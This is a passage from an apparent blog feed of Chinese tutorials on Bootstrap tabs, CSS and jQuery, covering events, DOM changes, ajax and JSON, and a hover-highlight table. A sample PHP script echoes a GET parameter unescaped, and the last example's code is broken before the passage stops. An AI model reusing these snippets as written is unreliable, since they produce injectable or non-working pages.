href=&quot;javascript:void(0);&quot;&gt;实战&lt;/a&gt;&lt;span&gt;|&lt;/span&gt;&lt;/li&gt; &lt;li&gt;&lt;a href=&quot;javascript:void(0);&quot;&gt;进阶&lt;/a&gt;&lt;span&gt;|&lt;/span&gt;&lt;/li&gt; &lt;/ul&gt; 其中’a’标签的class=”cur”表示当前被选中的标签。后面再CSS中会设置它的样式。 2.标签页内容区 使用3个DIV,分别存放入门、实战和进阶的图书。 &lt;div class=&quot;booklist&quot;&gt; 入门级图书…… &lt;/div&gt; &lt;div class=&quot;booklist&quot; style=&quot;display:none;&quot;&gt; 实战类图书…… &lt;/div&gt; &lt;div class=&quot;booklist&quot; style=&quot;display:none;&quot;&gt; 进阶类图书…… &lt;/div&gt; 可以看到，初始时，只有第一个标签页的内容是显示的，而其它两个标签页内容是隐藏（style=&quot;display:none;&quot;）的,后面会利用Jquery来控制他们的切换。 3.使用缩略图（thumbnail）组件展示图书信息 在该组件中包含了图书封面、图书标题、和链接到该图书页面的超级链接。 &lt;div class=&quot;thumbnail&quot; style=&quot;height:220px; border-width:0px;&quot;&gt; &lt;a href=&quot;/book/577e11aa2f33c&quot; target=&quot;_blank&quot;&gt; &lt;img style=&quot;height:130px;&quot; src=&quot;http://img3.doubanio.com/mpic/s1039608.jpg&quot;&gt; &lt;/a&gt; &lt;div class=&quot;caption&quot;&gt; &lt;h5 style=&quot;text-align:center;&quot;&gt; &lt;a href=&quot;/book/577e11aa2f33c&quot; target=&quot;_blank&quot;&gt; LINUX权威指南（... &lt;/a&gt;&lt;/h5&gt; &lt;p style=&quot;text-align:center;&quot;&gt; 评论(0) &lt;span class=&quot;badge&quot;&gt;1推荐&lt;/span&gt;&lt;/p&gt; &lt;/div&gt; &lt;/div&gt; 另外，每本图书所占的宽度为col-md-3,也就是每4本书占据一行。 设计Tab的样式下面我们来设计他的CSS样式，让我们的tabs尽量美观。这些样式主要包括： 标签项样式 标签项中链接的样式 当前被选中标签的样式（cur） //选项卡列表样式 #booksfilter li { padding:5px;//内边距 5px list-style-type:none; float:left; padding:0px; } //设置‘|’的左右边距 #booksfilter span { margin-left:5px; margin-right:5px; } //选项卡链接的样式 #booksfilter a { padding:5px;//内边距：5px text-decoration:none;//无下划线 } //选项卡被选中或当鼠标移动到选项卡时的样式 #booksfilter a.cur,#booksfilter a:hover { background-color:#e67e22;//背景色 color:white;//前景色 border-radius:5px;//圆角 } 代码注释已经很详细了，当然大家也可以修改它来设计出更美的样式。 实现Tab的行为当标签项点击切换的时候，这部分的交互就要交给Jquery代码来完成了。 代码设计思路如下： 遍历所有的标签页，为每个标签页添加点击(click)事件的处理函数 在该处理函数，高亮（使用Jquery在该标签项的class中添加cur）显示当前标签项和其对应的标签页，隐藏其它。 $(function() { $(&apos;#booksfilter a&apos;).each(function(i) {//对每个tabs中的标签添加点击（click）事件的处理函数 $(this).click(function(){ $(this).addClass(&apos;cur&apos;); $(this).parent().siblings().find(&apos;a&apos;).removeClass(&apos;cur&apos;);//删除其他任何选项的cur类 $(&apos;.booklist&apos;).eq(i).show();//显示本节点 $(&apos;.booklist&apos;).eq(i).siblings().hide();//隐藏兄弟节点 }) }); }); 在右侧具体代码中，为了适应屏幕大小，将col-md-3改为了col-xs-3,如果你想使用这个插件的话在你的项目中记得改回去:)。另外，js代码直接放在了HTML的尾部。 仿豆瓣分类标签的实现为了和文章分类部分的样式进行区分，我决定自己动手写一个具有其他样式的分类标签集。刚好看到豆瓣读书板块的首页中的图书分类标签还不错，于是决定自己写一个类似的样式。首先是HTML代码部分： &lt;div class=&quot;col-md-4&quot;&gt; &lt;h5 style=&quot;margin-top:0px;&quot;&gt; 图书分类 &lt;/h5&gt; &lt;div class=&quot;row&quot; id=&quot;bookclass&quot;&gt; &lt;a href=&quot;图书分类页面&quot; class=&quot;col-md-3&quot;&gt;分类名&lt;/a&gt; &lt;!--其他分类--&gt; &lt;/div&gt; &lt;/div&gt; 可以看到图书分类标签很简单——直接使用’a’标签作为分类标签，下面只要针对它写CSS样式就可以了。 //a标签样式 #bookclass a { display:block;//区块显示 background-color:#f5f5f5;//背景色（跟豆瓣相同） text-align:center;//文字居中 padding:2px 5px;//内边距，上下2px，左右5px float:left;//左浮动，从而可以实现水平排列 margin:2px 2px;//外边距，上下2px,左右2px } //当鼠标悬停时改变背景色 #bookclass a:hover { background-color:#e8e8e8;//同豆瓣颜色 } 用户板块的设计与实现布局由于项目开发时间仓促，用户板块没有加入特别的样式美化和行为，而是使用了原生tab。在用户板块中，主要展示最新加入的用户和为博客社区做出最多贡献的用户（高分用户）。布局比较简单，采用整块布局，利用它来展示用户信息。布局主要代码如下： &lt;div class=&quot;panel panel-default&quot;&gt; &lt;!--用户展示区--&gt; &lt;/div&gt; 用户板块的实现用到的BootStrap元素 在用户板块主要用到的BootStrap元素如下： Bootstrap tab——以标签页的方式展示新会员和高分会员 圆形图片区（img-circle）——用于展示用户的头像。 实现过程 用户板块主要使用了BootStrap tab,前面的章节已经介绍过其使用方法。主要包括： 1.在DIV中加入role=”tabpanel”，该DIV则会成为tab &lt;div role=&quot;tabpanel&quot;&gt; &lt;/div&gt; 2.使用列表来制作标签页 &lt;ul id=&quot;myTabregister&quot; class=&quot;nav nav-tabs&quot; role=&quot;tablist&quot;&gt; &lt;li role=&quot;presentation&quot; class=&quot;active&quot;&gt; &lt;a href=&quot;#newRegister&quot; id=&quot;home-tab&quot; role=&quot;tab&quot; data-toggle=&quot;tab&quot; aria-controls=&quot;home&quot; aria-expanded=&quot;true&quot;&gt;新会员&lt;/a&gt; &lt;/li&gt; &lt;li role=&quot;presentation&quot; class=&quot;&quot;&gt; &lt;a href=&quot;#highScoreRegister&quot; role=&quot;tab&quot; id=&quot;profile-tab&quot; data-toggle=&quot;tab&quot; aria-controls=&quot;profile&quot; aria-expanded=&quot;false&quot;&gt;高分会员&lt;/a&gt; &lt;/li&gt; &lt;/ul&gt; 同样，列表中，超级链接的地址href的值和单个标签内容页的id值一一对应，如最新会员标签项的href=&quot;newRegister&quot;。 3.标签内容区域（tab-content） &lt;div id=&quot;myTabContent&quot; class=&quot;tab-content&quot; style=&quot;text-align:center;&quot;&gt; &lt;!--最新会员展示区--&gt; &lt;!--高分会员展示区--&gt; &lt;/div&gt; 4.单个标签页(tabpanel) &lt;div role=&quot;tabpanel&quot; class=&quot;tab-pane fade active in&quot; id=&quot;newRegister&quot; aria-labelledby=&quot;home-tab&quot;&gt; &lt;div class=&quot;row&quot; style=&quot;margin-top:10px;&quot;&gt; &lt;div class=&quot;col-md-2&quot; style=&quot;height:200px;&quot;&gt; &lt;a href=&quot;会员主页&quot;&gt; &lt;img class=&quot;img-circle&quot; src=&quot;图片路径&quot;style=&quot;width:80px; height: 80px;&quot; &gt; &lt;/a&gt; &lt;/div&gt; &lt;!--其他最新会员……--&gt; &lt;/div&gt; &lt;!--高分会员--&gt; 该示例代码中主要列出了“最新会员”的展示信息，其ID为newRegister,与其标签项的链接地址相同。其中每个会员信息占有的屏幕宽度为col-md-2(在右侧代码中为了满足屏幕尺寸需要改为col-xs-2),也就是每6个用户占据一行。 本课程内容转自：汇智网]]></content>
      <tags>
        <tag>BootStrap</tag>
        <tag>前端</tag>
        <tag>编程</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[JQuery学习笔记]]></title>
    <url>%2F2016%2F08%2F28%2FJQuery%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%2F</url>
    <content type="text"><![CDATA[JQuery是什么？ Jquery是一个基于javascript的框架，等于说把javascript封装了一下。需要在html中链接了JQuery的文件才能用，你查看源代码，就能看到链接Jquery的代码： &lt;script language=&quot;javascript&quot; type=&quot;text/javascript&quot; src=&quot;https://www.xxx/js/jquery-1.8.3.min.js&quot;&gt;&lt;/script&gt; 学JQuery跟学javascript有什么区别，是不是要精通javascript才能学JQuery? jquery是基于javascript，所以可以说写jquery脚本有一半是在写javascript，但jquery又有很多特性是它独有的。jquery是封装了javascript，是为了简化javascript脚本而存在，所以没必要精通javascript，javascript中很多的函数在jquery中都有更简单的替代方式。 开始入门吧 入门之前，先简单地看一下html+css+javascript的语法，再来看这篇文章，这会让你更好地理解代码。Jquery最大的特点是方便对DOM的封装。什么是DOM？DOM就是操作html文件的树结构的方法，我们看图片。 从这个图很明显的就能看出，实际上html文件中每一个标签都是一个节点，整个html文档组成了一棵树。 在javascript中，我们有一些函数可以访问这些节点，并对他们进行增加、删除、修改。比如，getElementById(xxx)就是获得id为xxx的对象，它可能就是一个div标签。我们用面向对象的思想来看，实际上获得的是一个id为xxx的div对象。这个对象实际上就是从&lt;div id=xxx&gt;到相应&lt;/div&gt;这所有的内容。 通过这个对象的相关方法就能很方便地直接操作html文件。 在Jquery中，DOM变得更加简单。 选择器 要操作html文档，就用到选择器。 举个很简单的例子，$(“div#exm”) 选择了id为exm的div元素。如下代码能让“测试1”这三个字通过点击按钮显示在html中： &lt;html&gt; &lt;head&gt; &lt;script type=&quot;text/javascript&quot; src=&quot;/jquery/jquery.js&quot;&gt;&lt;/script&gt; &lt;script type=&quot;text/javascript&quot;&gt; $(document).ready(function(){ $(&quot;button&quot;).click(function(){ $(&quot;div#test&quot;).html(&quot;测试1&quot;); }); }); &lt;/script&gt; &lt;/head&gt; &lt;body&gt; &lt;button type=&quot;button&quot;&gt;点击我&lt;/button&gt; &lt;div id=&quot;test&quot;&gt;&lt;/div&gt; &lt;/body&gt; &lt;/html&gt; 大家可以把代码放进http://www.w3school.com.cn/tiy/t.asp?f=html_basic运行，查看效果。 来分析一下这一小段Jquery代码。首先，$(document)，这个选择器选择的是整个文档。ready是一个事件，表示等整个文档加载完成后再运行这段javascript。一般Jquery的代码都放在这个块里面。$(“botton”)选择了文档中第一个，也就是按钮。click也是一个事件，表示当该按钮被点击后执行这里面的代码。$(“div#test”)就是选择的id=test的元素，对该元素执行方法html()，html方法就是读取或修改中的内容。（具体是读取还是修改要看具体情况，在我这里就是修改） 所以，点击了按钮后，&lt;div id=&quot;exm&quot;&gt;&lt;/div&gt;中就被加入了“测试1”三个字。 到此为止，我们一共接触到如下几个概念： 选择器：$(xxx) 事件：ready()、click() 文档操作方法：html() 大家应该就了解个大概了。通过Jquery，我们就可以操作html中任何标签内的任何内容。我来列举几个。 修改css 通过css方法可以操作css。比如如下代码： &lt;html&gt; &lt;head&gt; &lt;script type=&quot;text/javascript&quot; src=&quot;/jquery/jquery.js&quot;&gt;&lt;/script&gt; &lt;script type=&quot;text/javascript&quot;&gt; $(document).ready(function(){ $(&quot;button&quot;).click(function(){ $(&quot;div#test&quot;).css(&quot;color&quot;, &quot;red&quot;); }); }); &lt;/script&gt; &lt;/head&gt; &lt;body&gt; &lt;button type=&quot;button&quot;&gt;Click me&lt;/button&gt; &lt;div id=&quot;test&quot;&gt;测试2&lt;/div&gt; &lt;/body&gt; &lt;/html&gt; 将刚才的代码改了一点，看这句话：$(“div#exm”).css(“color”, “red”); 将id=test的div元素的css样式color值改成red。我们点击了按钮后就能看到，“测试2”三个字变成了红色。 隐藏和显示和动画效果 Jquery自带了一些动画效果，通过一些参数就能显示出来。看如下代码 &lt;html&gt; &lt;head&gt; &lt;script type=&quot;text/javascript&quot; src=&quot;/jquery/jquery.js&quot;&gt;&lt;/script&gt; &lt;script type=&quot;text/javascript&quot;&gt; $(document).ready(function(){ $(&quot;button&quot;).click(function(){ $(&quot;div#test&quot;).hide(&apos;slow&apos;); }); }); &lt;/script&gt; &lt;/head&gt; &lt;body&gt; &lt;button type=&quot;button&quot;&gt;Click me&lt;/button&gt; &lt;div id=&quot;test&quot;&gt;测试3&lt;/div&gt; &lt;/body&gt; &lt;/html&gt; 点击了按钮后，“测试3”这三个字慢慢滑动离开了，很像幻灯片是吧？我也只是改了一句话：$(“div#exm”).hide(‘slow’); 将id=test的div元素隐藏，并且是慢慢隐藏，因为有’slow’参数。 hide方法就是隐藏一个元素所有内容的方法。它有一个参数，表示隐藏的快慢。 当然有hide方法就有show方法，用法一样。还有一个方法toggle，表示在隐藏和显示中切换。有这三个方法，我们很容易弹出一个菜单或让一个不要的内容消失，而且有动画效果。 当然，Jquery还支持更多动画效果，有很多方法，大家可以自己去探索。 改变元素大小 我们可以用Jquery的height()和width()方法改变一个元素的大小。这个工作也可以用css()方法完成。通过这个方法，我们可以动态改变我们网站的元素，来适应用户浏览器的分辨率。 更多事件：文本框获得、失去焦点 在很多网站填写表单的地方都用到了这个效果： &lt;html&gt; &lt;head&gt; &lt;script type=&quot;text/javascript&quot; src=&quot;/jquery/jquery.js&quot;&gt;&lt;/script&gt; &lt;script type=&quot;text/javascript&quot;&gt; $(document).ready(function(){ $(&quot;:text&quot;).focus(function(){ $(&quot;:text&quot;).val(&quot;&quot;); }); }); &lt;/script&gt; &lt;/head&gt; &lt;body&gt; &lt;input type=&quot;text&quot; value=&quot;请填写用户名&quot; style=&quot;color: #999;&quot;/&gt; &lt;/body&gt; &lt;/html&gt; 当鼠标点击输入框时“请填写用户名”这几个字消失掉。这就是focus事件，它表示某个控件获得焦点。看看代码，用到了一个选择器$(“:text”)，它表示所有type=text的input元素。当该元素获得焦点后，执行了val方法。这个方法就是改变input标签的value属性，也就是改变显示在文本框内的内容。 选择器详解和css语法 上面只提到了一个id选择器，选择id=xxx的某元素。其实Jquery的选择器可谓多种多样，对css比较熟悉的同学就很好学了，因为css的语法Jquery选择器基本都能用。 比如，css里面，定义一个类的样式的方法：.XXX{}，而在Jquery里选择一个class=XXX的元素的方法：$(“.XXX”)。 举一些常用的例子，详细的选择器说明在w3school里都有列出。 这只是我举的一些例子，基本上选择器Jquery和css类似，所以对css比较熟悉的人可以很快掌握Jquery的选择器语法，这也是Jquery流行的原因之一，很好学习，一通百通。 事件详解 在很多Jquery代码中，我们总是能看到是这样的形式： $(document).ready(function(){ //Jquery代码 }); 所有的代码被套在了最外层的ready中。我上次也提到了，ready是一个事件。我们上面说的选择器，它选择某元素的作用，其实就是为了完成后面的工作。看我们这个代码，$(document)选择的是document对象，这个对象学javascript应该很清楚，指的就是整个html文档。选在选在到了对象，这个对象有一个方法ready(); ready是一个事件。事件是什么概念，和很多编程一样，事件是由用户在执行相应的操作后自动触发的一个过程，我们可以给某事件绑定一个处理函数，当用户触发了这个事件后，就能执行我们绑定的函数。 ready()是一个事件绑定函数，它中间那个function(){}就是我们为ready事件绑定的函数。ready事件在对象加载完成后触发，我们前面选择的是document对象，所以这个ready就是指整个文档加载完成后触发的事件。 所以整段代码意思就是为document对象的ready事件添加响应函数function(){}，这个函数里面添加我们希望Jquery做的事情。当文档加载完成后，执行此函数，相当于执行我们的代码。 我列举一些Jquery中常用的事件及其绑定函数： click 鼠标点击事件 （最常用，当鼠标点击某对象时触发此函数） change 对象被改变（如input框中写入、修改、删除文字时触发此事件） focus 对象获得焦点（如光标进入textarea框触发此事件） blur 对象失去焦点（与focus事件相对） load 对象加载完成（如图像被加载完成时触发此事件） error 对象遇到错误 （如图像输入了一个错误的地址，没有成功加载） mousemove 鼠标移动 （当鼠标移动时触发此事件） 试试mousemove事件，运行这段代码： &lt;html&gt; &lt;head&gt; &lt;script type=&quot;text/javascript&quot; src=&quot;/jquery/jquery.js&quot;&gt;&lt;/script&gt; &lt;script type=&quot;text/javascript&quot;&gt; $(document).ready(function(){ $(document).mousemove(function(e){ $(&quot;span&quot;).text(e.pageX + &quot;, &quot; + e.pageY); }); }); &lt;/script&gt; &lt;/head&gt; &lt;body&gt; &lt;p&gt;鼠标位于坐标： &lt;span&gt;&lt;/span&gt;.&lt;/p&gt; &lt;/body&gt; &lt;/html&gt; 可以看到，鼠标移动后就能输出当前鼠标所在的坐标。其中function有一个参数e，每个事件函数都有一个参数，这个参数就是指该事件本身。（当然这个参数可以省略），e.pageX和e.pageY就是指鼠标以后后鼠标所在的位置。 html操作详解 选择器的作用我说了，就是完成为了后面的操作。除了为选择到的对象添加一个事件响应函数外，还能直接操作此对象，这就是我们的html操作。 我也列举一些常用的html操作方法（更详细地在w3school中查看） 通过这些方法，我们能动态地对html页面进行操作。再结合ajax，就可以动态地向服务器请求内容，并在不刷新页面的情况下更新页面中一部分。 什么是ajax ajax指异步javascript。相信很多同学在百度百科里也看到了它的相关介绍，不过说的挺复杂，各种各样的专业术语。如果只是基础，我们这样理解ajax好了：利用ajax可以动态地以javascript的方式向服务器请求数据，并接受服务器发回的数据，这个过程浏览器可以做其他的任何工作，可以不离开页面，不刷新。 具体来说呢？我举个小例子，现在有一个注册表单，要用户填写用户名。一般都会有一个“检查是否已被占用”链接，用户点击链接后，浏览器打开一个新页面，向服务器发送一个请求，在数据库里咨询看用户名是否已存在，得到结果后返回到页面里提示用户。如果不用ajax，大家可以想象，点击了链接，浏览器势必要打开新页面，给用户带来不便。但是运用ajax，用户点击链接后，不打开新页面，而由javascript在后台向服务器获取结果，然后用一个提示框弹出提示用户，用户在这个过程中还可以继续填写表单，两个过程互不影响。页面不会跳转，也不会刷新，用户之前填写的内容不会丢失。 这就是所谓的异步，类似于多线程。 甚至我们做一个网站，放上背景音乐，网站中一切链接都由ajax完成（比如点击了一片文章，ajax向服务器请求文章内容，然后用我上次说的Jquery html操作将网页中的一部分进行修改，这样文章就放入了页面而并不刷新页面），这样我们的音乐就一直不会被刷新。 所以说ajax最大的优点，就是在不更新整个页面的情况下对部分内容进行修改、维护，这样服务器发送的数据少，减少了服务器的负担。 简单的ajax获取信息 来看看我们用Jquery怎么去结合ajax。 首先看看怎么获取服务器上一个txt文件：使用load()方法 (因为ajax使用同源策略，所以在哪个网站运行代码就只能请求该服务器上的内容，我请求的是w3school中的一个txt文件，大家把代码放在http://www.w3school.com.cn/tiy/t.asp?f=html_basic运行才能看到效果) &lt;!DOCTYPE html&gt; &lt;html&gt; &lt;head&gt; &lt;script src=&quot;//ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.min.js&quot;&gt; &lt;/script&gt; &lt;script&gt; $(document).ready(function(){ $(&quot;#btn1&quot;).click(function(){ $(&apos;#test&apos;).load(&apos;http://www.w3school.com.cn/example/jquery/demo_test.txt&apos;); }) }) &lt;/script&gt; &lt;/head&gt; &lt;body&gt; &lt;h3 id=&quot;test&quot;&gt;请点击下面的按钮，通过 jQuery AJAX 改变这段文本。&lt;/h3&gt; &lt;button id=&quot;btn1&quot; type=&quot;button&quot;&gt;获得外部的内容&lt;/button&gt; &lt;/body&gt; &lt;/html&gt; 大家可以看到，点击按钮后文本被改变。这其中我请求的就是http://www.w3school.com.cn/example/jquery/demo_test.txt文件。看到Jquery代码，它为按钮绑定了click事件，点击按钮后，执行$(‘#test’).load(‘http://www.w3school.com.cn/example/jquery/demo_test.txt‘); 也就是请求这个文本文件内容，并将id=test的元素内容改变成请求到的文本。 这是最简单的ajax，简单地请求一个文本文件。最常见的，我们是向一个脚本，通过get或post请求一个html或json。 ajax使用get请求向服务器请求html内容 又回到我们开始的那个例子，判断用户名是否存在。 比如我们服务器上有这样一个文件nameexists.php: &lt;?php $name = $_GET[&apos;act&apos;]; /* * *在数据库中咨询用户名是否存在 * */ $re = true; //假设用户名存在 if($re){ echo &quot;用户名 $name 已存在&quot;; }else{ echo &quot;恭喜您，该用户名可以使用&quot;; } ?&gt; 然后我们浏览器表单如下： &lt;script src=&quot;//ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.min.js&quot;&gt;&lt;/script&gt; &lt;script type=&quot;text/javascript&quot;&gt; function sub(){ var name = $(&quot;#name&quot;).val(); $.get(&quot;nameexists.php&quot;, { &quot;act&quot;: name }, function(data, status){ if (status) {alert(data);} }); } &lt;/script&gt; &lt;form&gt; &lt;input type=&quot;text&quot; id=&quot;name&quot; /&gt; &lt;input type=&quot;button&quot; value=&quot;验证&quot; onclick=&quot;sub();&quot;/&gt; &lt;/form&gt; 大家试验即可看到，当点击“验证”后，弹出提示框 并没有刷新页面，我们填写的内容依旧在表单中。这就是向服务器请求了html，返回的“用户名…已存在”就是一个html文本，最后体现在用户面前。 我们看Jquery代码。这是一个javascript函数，当点击按钮时执行此函数。首先选择器选择了id=name的文本框，用val()方法获取其值，并赋值给name变量。 看后面，用到了get方法。这个方法是一个全局的方法，所以写成$.get，这个方法有三个参数：$.get(url, data, callback); url是我们要请求的地址，data是我们要传递的参数，写成{‘索引1’:’参数2’,’索引2’:’参数2’…}的形式，也可以把他们直接写在url后面: url?a=1&amp;b=2… （只适用于get请求）。第三个参数callback是一个回调函数，这个函数在获取到数据后运行，也就是说收到的数据可以在这个函数中处理。函数原型：function(data,status,xhr) data是获得的返回数据，status是状态（成功或失败），xhr是XMLHttpRequest对象（我这里用不上）。 所以大家可以看到，我直接把获得的返回数据data弹出来：alert(data)。而我们看到php，其实这个data就是echo输出的内容。 类似于get方式，post()方法参数都与get相同，我就不举例子了。这是获取的html内容，其实在javascript中，更多的是获取json，再通过javascript代码处理json来显示给我们用户看。 什么是json 又到了普及概念的时候。json是一种javascript原生的数据交换格式。 在互联网上，最普遍的就是数据交换。比如在QQ上，A向B发送一个数字，一个字母或一句话，来告诉B某些信息。但是数字、字符串很好传递，有些对象却并不那么容易传递，比如数组。我们怎么把一个数组对象通过QQ发送给别人？ 有些人就说，这很简单啊，在php里，不就是“array(1=&gt;’a’,2=&gt;’b’,3=&gt;’C’);”我就把这个字符串给B发送过去，B一看就知道数组是怎么构成的了。对，其实这就是一种数据交换格式，不过这仅仅是php里定义数组的语法，如果B不懂php，他也许就看不懂你给他发送是这个是什么意思。 所以就诞生了json和xml两种通用的数据交换格式。我不说xml也不比较二者，只来说说json。因为json是从javascript发展出来的，所以十分适合javascript。比如刚才的数组，用json写出来： { &quot;1&quot;: &quot;a&quot;, &quot;2&quot;: &quot;b&quot;, &quot;3&quot;: &quot;C&quot; } 这样的json能在任何javascript中被解析成一个json对象，我们可以通过json.xxx来得到相应内容。 ajax的json方法 Jquery中从服务器加载json数据的方法是：$.getJSON 它的参数与get()方法完全一样，但是服务器返回结果data应该是一个json格式的字符串（如果不是就出错）。 我说了json是一个通用的数据交换编码，所以在php里也有方法把对象处理成json字符串。在php5.2以上的版本，有了一对函数json_encode()和json_decode()，分别对php中对象进行json格式的编码和解码。 举个没什么营养的例子。 服务端： &lt;?php $arr = array(&apos;name&apos;=&gt;&apos;name&apos;, &apos;url&apos;=&gt;&quot;url&quot;, &apos;PR&apos;=&gt;0); echo json_encode($arr); ?&gt; 浏览器： &lt;script src=&quot;//ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.min.js&quot; type=&quot;text/javascript&quot;&gt;&lt;/script&gt; &lt;script type=&quot;text/javascript&quot;&gt; function sub(){ $.getJSON(&quot;test2.php&quot;, function(data, status){ if (status){ $(&quot;div&quot;).html(data.name + &apos; | &apos; + data.url + &apos; | &apos; + data.PR); } }); } &lt;/script&gt; &lt;form&gt; &lt;div&gt;&lt;/div&gt; &lt;input type=&quot;button&quot; value=&quot;提交&quot; onclick=&quot;sub();&quot;/&gt; &lt;/form&gt; 大家可以试验，点击了按钮后，打印出了php中定义的数组内容。php端两行代码，定义了一个数组，并用json_encode把数组做成一个json编码的字符串输出。 再看Jquery代码，大家会发现，实际上获得的内容是一个对象，我们用点号访问对象中内容：data.name, data.url, data.PR. 这只是json的简单事例，没什么实用性。大家可以试想，假如图书馆有个图书检索系统，用户向服务器请求书名，服务器查询数据库后把所有符合条件图书信息做成一个二维数组，再用json形式发送给浏览器，Jquery把他们美化后输出，过程并不复杂。 一个鼠标移动上去就变换颜色的表格 &lt;html&gt; &lt;head&gt; &lt;title&gt;表格1&lt;/title&gt; &lt;style&gt; table.hovertable { font-size:13px; color:#333333; border-width: 1px; border-color: #999999; border-collapse: collapse; width: 100%; } table.hovertable th { background-color:#c3dde0; border-width: 1px; padding: 8px; border-style: solid; border-color: #a9c6c9; text-align: left; } table.hovertable tr { background-color:#d4e3e5; } table.hovertable td { border-width: 1px; padding: 8px; border-style: solid; border-color: #a9c6c9; } &lt;/style&gt; &lt;script src=&quot;//ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.min.js&quot;&gt;&lt;/script&gt; &lt;script&gt; $(document).ready(function(){ $(&quot;.hovertable td&quot;).mouseover(function(event){ event.target.parentNode.style.backgroundColor = &quot;#F0FFFF&quot;; }); $(&quot;.hovertable td&quot;).mouseout(function(event){ event.target.parentNode.style.backgroundColor = &quot;#d4e3e5&quot;; }); }); &lt;/script&gt; &lt;/head&gt; &lt;body&gt; &lt;table class=&quot;hovertable&quot;&gt; &lt;tr&gt;&lt;th&gt;标题&lt;/th&gt;&lt;th&gt;内容&lt;/th&gt;&lt;th&gt;时间&lt;/th&gt;&lt;/tr&gt; &lt;tr&gt;&lt;td&gt;1&lt;/td&gt;&lt;td&gt;aaa&lt;/td&gt;&lt;td&gt;15:30&lt;/td&gt;&lt;/tr&gt; &lt;tr&gt;&lt;td&gt;2&lt;/td&gt;&lt;td&gt;bbb&lt;/td&gt;&lt;td&gt;17:40&lt;/td&gt;&lt;/tr&gt; &lt;tr&gt;&lt;td&gt;3&lt;/td&gt;&lt;td&gt;ccc&lt;/td&gt;&lt;td&gt;13:35&lt;/td&gt;&lt;/tr&gt; &lt;tr&gt;&lt;td&gt;4&lt;/td&gt;&lt;td&gt;ddd&lt;/td&gt;&lt;td&gt;08:53&lt;/td&gt;&lt;/tr&gt; &lt;/table&gt; &lt;/body&gt; &lt;/html&gt; 大家依旧是放到http://www.w3school.com.cn/tiy/t.asp?f=jquery_hide 运行，可以看到，当鼠标移动到相应的行上的时候，该行变色，当鼠标移走时，颜色恢复。 这个效果相信大家在很多地方见到过，我这里运用了Jquery和HTML DOM两种方法结合。这就是我要说的一个重点。 我们看Jquery代码：$(&quot;.hovertable td&quot;).mouseover，选择了class=hovertable的元素的td子元素，为他的mouseover事件绑定一个函数。td元素就是表格中的一个格子，mouseover事件指“鼠标移动到上面”。也就是说，当用户鼠标移动到每个格子上，都会触发这个事件，进而执行函数中的代码。 看到这个函数中的代码，event.target.parentNode.style.backgroundColor = &quot;#F0FFFF&quot;; event是什么？我们可以看到，function(event)，所以event是这个事件绑定函数的一个参数，它指的就是“鼠标掠过”事件对象。 为什么要用这个event？因为我们可以看到，鼠标移动到某一行上，只有这一行的颜色会发生变化，我们必须知道鼠标移动到哪一行上了，所以必须获得这个event对象。 event对象有如下一些方法或属性： 大家可以看到，我用到的就是target属性，event.target指的就是触发mouseover事件的DOM元素，在这里就是td。 所以在函数中，我们得到了鼠标所在的元素。在这里，我来说一下我们获得的这个DOM对象。 在Jquery中，有对html操作的一些函数，比如$(xx).html()，获取某元素内的内容。而在单纯的javascript中，也有对html操作的DOM函数，比如xx.innerHTML，它也是获取某元素中的内容。而在实际运用中，这两种函数是不能互相使用的。比如我们一个Jquery对象：$(“div#test”)，它不能用$(&quot;div#test&quot;).innerHTML来获取内容，只能用$(&quot;div#test&quot;).html()来获取。 同样的，对于DOM对象event.target，也是不能使用Jquery的方法的。比如，有的同学直接使用event.target.css(&#39;background-color&#39;,&#39;red&#39;)，想这样更改它的背景颜色。这样浏览器是会报错的，错误是td对象不含有css方法。 所以大家可以看到，我使用的是DOM中的方法event.target.parentNode.style.backgroundColor，首先用parentNode获得td元素的父元素tr元素（因为我是要一行都改变颜色，而不是只让鼠标所在的格子改变颜色），再用style属性，改变tr元素的样式。这里说一下，style下面有很多属性，比如这里的backgroundColor是指css中的&#39;background-color&#39;，一般都是css中的名字，其中第二个单词首字母变成大写。 所以这句话也就是改变了tr的样式，将css中的background-color改成#F0FFFF。 第二个函数也一样，mouseout方法是指“鼠标离开”，如果鼠标移开，就把颜色改回以前的颜色。这样就完成了我们这个“变色表格”的制作。 一个选择商品系统 我们继续来强化刚才制作的这个表格。 &lt;html&gt; &lt;head&gt; &lt;title&gt;表格1&lt;/title&gt; &lt;style&gt; table.hovertable { font-size:13px; color:#333333; border-width: 1px; border-color: #999999; border-collapse: collapse; width: 100%; } table.hovertable th { background-color:#c3dde0; border-width: 1px; padding: 8px; border-style: solid; border-color: #a9c6c9; text-align: left; } table.hovertable tr { background-color:#d4e3e5; } table.hovertable td { border-width: 1px; padding: 8px; border-style: solid; border-color: #a9c6c9; } &lt;/style&gt; &lt;script src=&quot;//ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.min.js&quot;&gt;&lt;/script&gt; &lt;script&gt; $(document).ready(function(){ $(&quot;.hovertable td&quot;).mouseover(function(event){ event.target.parentNode.style.backgroundColor = &quot;#F0FFFF&quot;; }); $(&quot;.hovertable td&quot;).mouseout(function(event){ event.target.parentNode.style.backgroundColor = &quot;#d4e3e5&quot;; $(&quot;.hovertable td&quot;).click(function(event){ var name = $(event.target.parentNode).children(&quot;td:first&quot;).html(); var price = $(event.target.parentNode).children(&quot;td:last&quot;).html(); $(event.target.parentNode).remove(); $(&quot;#buy&quot;).append(&apos;&lt;p&gt;&apos; + name + &quot;/&quot; + price + &apos;元&lt;/p&gt;&apos;); }); }); &lt;/script&gt; &lt;/head&gt; &lt;body&gt; &lt;tr&gt;&lt;th width=&quot;40%&quot;&gt;商品&lt;/th&gt;&lt;th width=&quot;40%&quot;&gt;类别&lt;/th&gt;&lt;th&gt;价格&lt;/th&gt;&lt;/tr&gt; &lt;tr&gt;&lt;td&gt;肥皂&lt;/td&gt;&lt;td&gt;日用品&lt;/td&gt;&lt;td&gt;5.5&lt;/td&gt;&lt;/tr&gt; &lt;tr&gt;&lt;td&gt;拖把&lt;/td&gt;&lt;td&gt;清洁用品&lt;/td&gt;&lt;td&gt;25.0&lt;/td&gt;&lt;/tr&gt; &lt;tr&gt;&lt;td&gt;硬盘&lt;/td&gt;&lt;td&gt;电子产品&lt;/td&gt;&lt;td&gt;450.0&lt;/td&gt;&lt;/tr&gt; 